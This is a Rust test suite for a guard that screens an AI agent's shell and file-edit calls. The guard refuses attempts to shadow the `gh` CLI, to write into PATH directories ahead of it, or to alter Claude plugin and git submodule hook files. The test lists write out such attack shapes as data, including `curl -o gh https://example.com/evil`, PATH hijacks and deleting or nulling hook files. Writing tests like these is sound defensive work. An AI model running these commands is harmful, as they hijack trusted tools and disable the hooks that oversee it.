//! gh shadowing, the PATH directories before the real gh, and plugin and
//! submodule hook files (yaadgaar #240, ADR-1020).
//!
//! Each refusing set ships with the corpus it must not refuse (ADR-0971):
//! a widening that blocks ordinary work is a guard somebody switches off.

use std::path::{Path, PathBuf};
use std::sync::atomic::{AtomicUsize, Ordering};

use super::*;

#[path = "clobber.rs"]
mod clobber;

fn edit(tool: &str, path: &str) -> Value {
    json!({"tool_name": tool, "tool_input": {"file_path": path, "content": "x"}})
}

fn ps_call(command: &str) -> Value {
    json!({"tool_name": "PowerShell", "tool_input": {"command": command}})
}

/// The calls in *calls* that `judge` does not refuse with *reason*.
fn not_refused_as(
    calls: &[Value],
    reason: &str,
    judge: impl Fn(&Value) -> Decision,
) -> Vec<String> {
    calls
        .iter()
        .filter_map(|c| match judge(c) {
            Decision::Deny(r) if r == reason => None,
            other => Some(format!("{c} => {other:?}")),
        })
        .collect()
}

/// The calls in *calls* that `judge` refuses.
fn refused(calls: &[Value], judge: impl Fn(&Value) -> Decision) -> Vec<String> {
    calls
        .iter()
        .filter_map(|c| match judge(c) {
            Decision::Allow => None,
            other => Some(format!("{c} => {other:?}")),
        })
        .collect()
}

fn bash_calls(lines: &[&str]) -> Vec<Value> {
    lines.iter().map(|l| bash_call(l)).collect()
}

// ── (1) lines that shadow gh ─────────────────────────────────────────────────

const SHADOWING: &[&str] = &[
    // ADR-0971's bypass test for the gh-api relaxation: it is sound only
    // while `gh` is the real gh.
    "gh() { rm -f /tmp/x; }; gh api repos/$r/tags",
    "gh () { :; }",
    "function gh { :; }",
    "function gh() { :; }",
    "gh-personal() { :; }",
    "alias gh='rm -rf /tmp/x'",
    "alias gh-personal=x",
    "functions[gh]='rm x'",
    "aliases[gh]=x",
    // PATH, in every spelling bash and zsh assign it.
    "PATH=/tmp/evil:$PATH gh api repos/$r",
    "export PATH=/tmp/evil:$PATH",
    "env PATH=/tmp/evil gh pr list",
    "declare -x PATH=/tmp/evil",
    "PATH+=:/tmp/evil",
    "path=(/tmp/evil $path)",
    "path+=/tmp/evil",
    "path[1]=/tmp/evil",
    "read PATH",
    "printf -v PATH /tmp/evil",
    // hash / enable / source / eval / command -p touching gh.
    "hash -p /tmp/evil/gh gh",
    "hash gh=/tmp/evil/gh",
    "enable -f /tmp/evil.so gh",
    "source /tmp/gh.sh",
    ". ./gh",
    "eval 'gh() { :; }'",
    "eval alias gh=x",
    "command -p gh api repos/x",
    // A file named gh, written anywhere.
    "cp /tmp/evil ~/bin/gh",
    "ln -s /tmp/evil /tmp/bin/gh",
    "echo '#!/bin/sh' > gh",
    "curl -o gh https://example.com/evil",
    "install -m755 /tmp/e /opt/bin/gh",
    "chmod +x ./gh",
    "tee /tmp/bin/gh-personal",
    "dd if=/tmp/e of=/tmp/bin/gh",
    "cp /tmp/e /tmp/bin/GH.exe",
    // Through every route the guard already follows.
    "sh -c 'gh() { :; }; gh api repos/x'",
    r#"echo "$(cp /tmp/e ~/bin/gh)""#,
    "timeout 5 cp /tmp/e ~/bin/gh",
    // Behind a compound command's opener, which the scanner keeps as the
    // command's first word.
    "for i in 1; do export PATH=/tmp/evil:$PATH; done",
    "{ PATH=/tmp/evil gh api repos/$r/tags; }",
    "if PATH=/tmp/evil true; then :; fi",
    "if true; then alias gh=x; fi",
    "while :; do hash -p /tmp/evil gh; done",
    "for i in 1; do cp /tmp/e gh; done",
    "! command -p gh api repos/x",
];

#[test]
fn a_line_that_shadows_gh_is_refused() {
    let wrong = not_refused_as(&bash_calls(SHADOWING), SHADOW, guard);
    assert!(wrong.is_empty(), "not refused as shadowing: {wrong:#?}");
}

#[test]
fn an_edit_that_writes_a_file_named_gh_is_refused() {
    for tool in ["Edit", "Write", "MultiEdit"] {
        for path in [
            "/home/x/bin/gh",
            "gh",
            "/tmp/bin/gh-personal",
            r"C:\bin\gh.exe",
        ] {
            assert_eq!(
                guard(&edit(tool, path)),
                Decision::Deny(SHADOW.into()),
                "{tool} {path}"
            );
        }
        for path in [
            "/home/x/repo/src/gh.rs",
            "/home/x/repo/gh/README.md",
            "/home/x/ghost",
        ] {
            assert_eq!(guard(&edit(tool, path)), Decision::Allow, "{tool} {path}");
        }
    }
}

/// What agents do with gh, PATH-like variables and files near the name.
const NOT_SHADOWING: &[&str] = &[
    "gh pr view 12",
    "gh --version",
    "gh api repos/$r/git/refs/tags/$t",
    "gh-personal api repos/$r/tags",
    "gh api repos/cli/gh",
    "for r in a b; do gh api repos/$r/tags; done",
    "which gh",
    "command -v gh",
    "type gh",
    "/run/current-system/sw/bin/gh auth status",
    "nix profile install nixpkgs#gh",
    "git clone https://github.com/cli/gh",
    "ls ~/.local/bin/gh",
    "GOPATH=/x go build",
    "PYTHONPATH=. python3 x.py",
    "MANPATH=/x man ls",
    "LD_LIBRARY_PATH=/x ./a.out",
    "CARGO_TARGET_DIR=/x cargo test",
    "export GH_TOKEN=abc",
    "export PATH",
    "echo $PATH",
    "echo PATH=$PATH",
    "grep -n PATH= README.md",
    "hash -r",
    "source .venv/bin/activate",
    "mkdir -p /tmp/ghx",
    "cp x /tmp/ghost",
    "rg 'fn gh' src",
    "pipx install yaadgaar",
    "pipx install --force yaadgaar==0.2.0",
    // A PR body that describes the shapes, written as data.
    "cat > /tmp/pr.md <<'EOF'\nRefuses gh() { :; }, alias gh=x and PATH=/x.\nEOF\ngh pr create --body-file /tmp/pr.md",
];

/// Lines from the operator's own sessions.
const DAILY: &[&str] = &[
    r#"export GH_TOKEN="$(cat ~/.local/state/gh-personal/token)""#,
    "SSH_AUTH_SOCK=/home/max/.1password/agent.sock git commit -F /tmp/m.txt",
    "export CARGO_TARGET_DIR=$HOME/.cache/yadgarhq-target/yadgar; timeout 900 cargo test",
    "git -C ~/git/yadgarhq/yadgar worktree add ~/git/yadgarhq/.worktrees/x -b x origin/main",
    "gh pr view 90 --repo yadgarhq/yadgar --json body",
];

#[test]
fn ordinary_work_near_gh_is_not_refused() {
    let wrong = refused(&bash_calls(DAILY), guard);
    assert!(wrong.is_empty(), "over-refused: {wrong:#?}");
    let wrong = refused(&bash_calls(NOT_SHADOWING), guard);
    assert!(wrong.is_empty(), "over-refused: {wrong:#?}");
}

#[test]
fn powershell_shadowing_gh_is_refused() {
    let shadowing: Vec<Value> = [
        "Set-Alias gh C:\\evil.exe",
        "New-Alias -Name gh -Value C:\\evil.exe",
        "sal gh-personal x",
        "function gh { }",
        "$env:PATH = 'C:\\evil;' + $env:PATH",
        "$env:Path += ';C:\\evil'",
        "[Environment]::SetEnvironmentVariable('Path', 'C:\\evil')",
    ]
    .iter()
    .map(|c| ps_call(c))
    .collect();
    let wrong = not_refused_as(&shadowing, SHADOW, guard);
    assert!(wrong.is_empty(), "not refused as shadowing: {wrong:#?}");
    let ordinary: Vec<Value> = [
        "gh pr list",
        "$env:GH_TOKEN = 'x'",
        "Get-Alias",
        "echo $env:PATH",
    ]
    .iter()
    .map(|c| ps_call(c))
    .collect();
    let over = refused(&ordinary, guard);
    assert!(over.is_empty(), "over-refused: {over:#?}");
}

// ── (2) the PATH directories before the real gh ──────────────────────────────

/// A temporary home with `~/.local/bin` (no gh), `real` (an executable gh)
/// and `late`, on a PATH in that order. Never the live environment.
struct Machine {
    root: PathBuf,
    env: GuardEnv,
}

impl Machine {
    fn new(tag: &str, gh_mode: Option<u32>) -> Self {
        // A plain name: a literal path the line may assign must hold no `(`.
        static N: AtomicUsize = AtomicUsize::new(0);
        let n = N.fetch_add(1, Ordering::Relaxed);
        let root = std::env::temp_dir().join(format!(
            "yaadgaar-guard-path-{tag}-{}-{n}",
            std::process::id()
        ));
        let _ = std::fs::remove_dir_all(&root);
        let home = root.join("home");
        let early = home.join(".local/bin");
        let (real, late) = (root.join("real"), root.join("late"));
        for d in [&early, &real, &late] {
            std::fs::create_dir_all(d).unwrap();
        }
        if let Some(mode) = gh_mode {
            let gh = real.join("gh");
            std::fs::write(&gh, "#!/bin/sh\n").unwrap();
            set_mode(&gh, mode);
        }
        let path = std::env::join_paths([&early, &real, &late]).unwrap();
        let env = GuardEnv::resolve(None, Some(home), Some(&path));
        Self { root, env }
    }

    fn dir(&self, rel: &str) -> String {
        self.root.join(rel).to_string_lossy().into_owned()
    }

    fn judge(&self, call: &Value) -> Decision {
        pre_tool_guard(call, &Policy::ALL_ON, &self.env)
    }
}

impl Drop for Machine {
    fn drop(&mut self) {
        let _ = std::fs::remove_dir_all(&self.root);
    }
}

#[cfg(unix)]
fn set_mode(path: &Path, mode: u32) {
    use std::os::unix::fs::PermissionsExt;
    std::fs::set_permissions(path, std::fs::Permissions::from_mode(mode)).unwrap();
}

#[cfg(not(unix))]
fn set_mode(_: &Path, _: u32) {}

#[test]
fn the_directories_before_the_real_gh_are_resolved_at_check_time() {
    let m = Machine::new("resolve", Some(0o755));
    let early = PathBuf::from(m.dir("home/.local/bin"));
    assert!(m.env.before_gh.contains(&early), "{:?}", m.env.before_gh);
    for after in ["real", "late"] {
        assert!(
            !m.env.before_gh.contains(&PathBuf::from(m.dir(after))),
            "{after}: {:?}",
            m.env.before_gh
        );
    }
}

#[cfg(unix)]
#[test]
fn a_gh_that_is_not_executable_is_not_the_real_gh() {
    let m = Machine::new("noexec", Some(0o644));
    assert!(m.env.before_gh.contains(&PathBuf::from(m.dir("real"))));
}

#[test]
fn no_gh_on_path_protects_every_directory() {
    let m = Machine::new("nogh", None);
    for d in ["home/.local/bin", "real", "late"] {
        assert!(m.env.before_gh.contains(&PathBuf::from(m.dir(d))), "{d}");
    }
}

#[test]
fn a_write_into_a_directory_before_the_real_gh_is_refused() {
    let m = Machine::new("write", Some(0o755));
    let early = m.dir("home/.local/bin");
    let lines = [
        format!("cp /tmp/x {early}/tool"),
        format!("echo x > {early}/tool"),
        format!("mv /tmp/x {early}"),
        format!("cp /tmp/x {early}/"),
        "ln -s /tmp/x ~/.local/bin/tool".to_string(),
        "install -m755 /tmp/x $HOME/.local/bin/tool".to_string(),
        "cp /tmp/x ${HOME}/.local/bin/tool".to_string(),
        "rm ~/.local/bin/tool".to_string(),
        "chmod +x ~/.local/bin/tool".to_string(),
        // Shape (c) of ADR-1005: an unproven leaf under a literal directory.
        "cp /tmp/x ~/.local/bin/$f".to_string(),
        "cp /tmp/x ~/.local/bin/*".to_string(),
        format!("D={early}; cp /tmp/x $D/tool"),
        format!("D={early}; cp /tmp/x ${{D}}/tool"),
        "cat /tmp/x > ~/.local/bin/tool".to_string(),
        format!("cp --target-directory={early} /tmp/x"),
    ];
    let calls: Vec<Value> = lines.iter().map(|l| bash_call(l)).collect();
    let wrong = not_refused_as(&calls, SHADOW, |c| m.judge(c));
    assert!(wrong.is_empty(), "not refused: {wrong:#?}");
    for tool in ["Edit", "Write", "MultiEdit"] {
        assert_eq!(
            m.judge(&edit(tool, &format!("{early}/tool"))),
            Decision::Deny(SHADOW.into()),
            "{tool}"
        );
    }
}

#[test]
fn reading_running_and_installing_around_those_directories_is_not_refused() {
    let m = Machine::new("allow", Some(0o755));
    let (real, late) = (m.dir("real"), m.dir("late"));
    let lines = [
        format!("cp /tmp/x {late}/tool"),
        format!("cp /tmp/x {real}/tool"),
        "ls ~/.local/bin".to_string(),
        "ls -la ~/.local/bin/".to_string(),
        "cat ~/.local/bin/tool".to_string(),
        "~/.local/bin/yaadgaar --version".to_string(),
        "$HOME/.local/bin/yaadgaar verify".to_string(),
        "pipx install yaadgaar".to_string(),
        "pipx install --force yaadgaar==0.2.0".to_string(),
        "cp /tmp/x ~/.local/share/tool".to_string(),
        "cp /tmp/x ~/.local/bin2/tool".to_string(),
        "cp /tmp/x $OUT/tool".to_string(),
        "for i in 1; do ~/.local/bin/tool --version; done".to_string(),
        "for i in 1; do cat ~/.local/bin/tool; done".to_string(),
    ];
    let mut calls: Vec<Value> = lines.iter().map(|l| bash_call(l)).collect();
    // Every allowed corpus, with rule (2) active: `guard` runs with no PATH
    // directory protected, so these would otherwise never reach it.
    calls.extend(bash_calls(NOT_SHADOWING));
    calls.extend(bash_calls(super::protected::BASH_READS));
    calls.extend(bash_calls(DAILY));
    let wrong = refused(&calls, |c| m.judge(c));
    assert!(wrong.is_empty(), "over-refused: {wrong:#?}");
    assert_eq!(
        m.judge(&edit("Write", &format!("{late}/tool"))),
        Decision::Allow
    );
    assert_eq!(
        m.judge(&edit("Write", &m.dir("home/.local/share/x"))),
        Decision::Allow
    );
}

#[test]
fn hook_config_tamper_switched_off_allows_the_shadowing_shapes() {
    let off = Policy {
        hook_config_tamper: false,
        ..Policy::ALL_ON
    };
    let m = Machine::new("off", Some(0o755));
    for line in [
        "gh() { :; }",
        "export PATH=/tmp/evil",
        "cp /tmp/x ~/.local/bin/tool",
    ] {
        assert_eq!(
            pre_tool_guard(&bash_call(line), &off, &m.env),
            Decision::Allow,
            "{line}"
        );
    }
    assert_eq!(
        pre_tool_guard(&edit("Write", "/home/x/bin/gh"), &off, &m.env),
        Decision::Allow
    );
}

// ── (3) plugin and submodule hook files ──────────────────────────────────────

const HOOK_FILES: &[&str] = &[
    "/home/x/.claude/plugins/p/hooks/hooks.json",
    "/home/x/.claude/plugins/cache/m/p/1.0.0/hooks/hooks.json",
    "/home/x/.claude/plugins/marketplaces/m/plugins/p/hooks/hooks.json",
    "/home/x/.CLAUDE/Plugins/p/Hooks/Hooks.JSON",
    "/home/x/repo/.git/modules/sub/hooks/pre-commit",
    "/home/x/repo/.git/modules/sub/hooks",
    "/home/x/repo/.git/modules/libs/foo/hooks/pre-push",
    "/home/x/repo/.git/modules/a/modules/b/hooks/post-checkout",
    r"C:\repo\.git\modules\sub\hooks\pre-commit",
];

const NOT_HOOK_FILES: &[&str] = &[
    "/home/x/.claude/plugins/cache/m/p/1.0.0/hooks/notes.md",
    "/home/x/.claude/plugins/marketplaces/m/.codex/hooks.json",
    "/home/x/repo/hooks/hooks.json",
    "/home/x/repo/.git/modules/sub/config",
    "/home/x/repo/src/modules/hooks/x.rs",
];

#[test]
fn plugin_and_submodule_hook_files_are_protected_like_git_hooks() {
    for tool in ["Edit", "Write", "MultiEdit"] {
        for path in HOOK_FILES {
            assert_eq!(
                guard(&edit(tool, path)),
                Decision::Deny(PROTECTED.into()),
                "{tool} {path}"
            );
        }
        for path in NOT_HOOK_FILES {
            assert_eq!(guard(&edit(tool, path)), Decision::Allow, "{tool} {path}");
        }
    }
    let cfg = GuardEnv::with_config_dir(Some(Path::new("/home/x/.config/claude-work")));
    assert_eq!(
        pre_tool_guard(
            &edit(
                "Write",
                "/home/x/.config/claude-work/plugins/cache/m/p/1/hooks/hooks.json"
            ),
            &Policy::ALL_ON,
            &cfg
        ),
        Decision::Deny(PROTECTED.into())
    );
}

#[test]
fn a_bash_write_onto_a_plugin_or_submodule_hook_is_refused_and_a_read_is_not() {
    let writes = bash_calls(&[
        "cp /tmp/x ~/.claude/plugins/cache/m/p/1/hooks/hooks.json",
        "echo '{}' > ~/.claude/plugins/p/hooks/hooks.json",
        "cp /tmp/x ~/.claude/plugins/*/*/*/hooks/hooks.json",
        "rm -rf .git/modules/sub/hooks",
        "ln -sf /dev/null .git/modules/sub/hooks/pre-commit",
        "D=.git/modules/sub; rm $D/hooks/pre-commit",
    ]);
    let wrong = not_refused_as(&writes, PROTECTED, guard);
    assert!(wrong.is_empty(), "not refused: {wrong:#?}");
    let reads = bash_calls(&[
        "cat ~/.claude/plugins/cache/m/p/1/hooks/hooks.json",
        "jq . ~/.claude/plugins/p/hooks/hooks.json",
        "ls .git/modules/sub/hooks",
        "cp /tmp/x ~/.claude/plugins/p/notes.md",
        "git submodule update --init",
    ]);
    let over = refused(&reads, guard);
    assert!(over.is_empty(), "over-refused: {over:#?}");
}

#[test]
fn project_settings_stay_protected() {
    for path in [
        "/home/x/repo/.claude/settings.json",
        "/home/x/repo/.claude/settings.local.json",
    ] {
        assert_eq!(
            guard(&edit("Write", path)),
            Decision::Deny(PROTECTED.into())
        );
    }
}
